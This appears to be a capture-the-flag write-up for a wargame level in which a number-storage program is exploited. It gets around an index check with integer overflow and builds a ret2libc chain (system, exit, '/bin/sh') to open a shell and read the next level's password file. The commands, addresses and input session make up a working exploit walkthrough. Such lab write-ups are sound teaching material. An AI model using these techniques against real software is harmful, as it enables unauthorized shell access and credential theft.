# Bye pass canary with ret2libc 

## Protection

RELRO | STACK CANARY | NX | PIE
--- | --- | --- | --- 
**Partial RELRO** | **Canary found** | **NX disable** | No PIE 

## Context

```bash
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command:
```

Programm, store unsigned int number in a buffer[100]. We can store value, read and quit the program.

The only restriction to store a values are: You cant store if the user_index % 3 == 0 or if user_number >> 24 == 183

```c
  if ((user_index % 3 == 0) || (user_number >> 24 == 183)) {
	return ;
  }
```

So we can easely overflow, and control the overflow ! (good bye canary :bye:)

To sump up: store buffer is size int [100]. but we can write at index more than 100.

As we can in gdb : return addresss to main is 0xf7c21519.

To find it, I did write 0x41 at index 100, so we can see that buffer[114] should overwrite return address.

									0x00000041	0x726f7473
0xffffd2cc:	0x00000065	0x00000000	0x00000000	0x00000000
0xffffd2dc:	0x74f5de00	0x00000001	0x00000000	0xf7e26000
0xffffd2ec:	0xf7e26000	0xffffd3b4	0xf7ffcb80	0xf7ffd020
0xffffd2fc:	0xf7c21519	0x00000001	0xffffd3b4	0xffffd3bc

buffer[114] can't be overwrite because 114 % 3 = 0.

### Lets write 114 bye int overflow:

As we can see here :

```c
    *(uint *)(user_index * 4 + param_1) = user_number;
```

It mult 4 with user_index and add start of store number buffer to get the index to write.

Value max we can write is uint / 4 = 1073741824

So if i had 114 to 1073741824 overflow lead us to 114.

To sum up: to get 114 by the overflow : 

```py
(UINT_MAX / 4) + 114
(( 4294967296 / 4 ) + 114 ) = 1073741938
# And: 
1073741938 % 3 = 1
```

Nx is disable, but it seems annoying to write data in the buffer cause of restrictions.

So lets do a ret2lib.

## Ret2libc

stack | Precision
--- | ---
system() | <- eip overwrite
exit() | call simulation (for ret of system) (if you write shit it is ok but program seg after the return of system)
"/bin/sh" |  /

```py
info functions system
0xf7e6aed0  system #4159090384 

info function exit
0xf7e5eb70  exit #4159040368

info proc mappings
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec # "/bin/sh" 4160264172
```

```bash
./level07
Input command: store               
 Number: 4159090384
 Index: 1073741938 #index 114
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116 
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ[...]
```